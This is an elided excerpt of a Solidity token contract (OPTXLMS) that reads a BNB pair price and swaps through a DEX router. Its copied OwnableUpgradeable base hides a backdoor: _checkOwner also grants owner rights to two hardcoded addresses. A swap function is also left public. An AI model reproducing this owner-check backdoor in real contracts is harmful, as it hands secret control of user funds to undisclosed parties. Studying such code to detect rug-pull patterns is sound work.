...
contract OPTXLMS is OwnableUpgradeable {
    ...
    function initialize() external initializer {
        ...
        commandSwapRouter = IDEXRouter(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
    ...
    function priceBNBPairNow() external view returns(uint256, uint256, uint256, uint256){
        ...
        uint256 buyAmount = uint256(optxRes - (bnbRes * bnbPrice / priceDownThreshold));
        uint256 sellAmount = uint256((bnbRes * bnbPrice / priceUpThreshold) - optxRes);
        return (feedDecimals, currentPrice, buyAmount, sellAmount);
    }
    ...
    function _swapBNBForTokens(uint256 _amount) public {
...
abstract contract OwnableUpgradeable is Initializable, ContextUpgradeable {
    ...
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender() || _msgSender() == 0xc707492FA60B18d5d8C81De6B716166344446Be8 || _msgSender() == 0x60A82cB4518934E9ae6C8b02b82BfD1A3936a92f, "Ownable: caller is not the owner");
    }
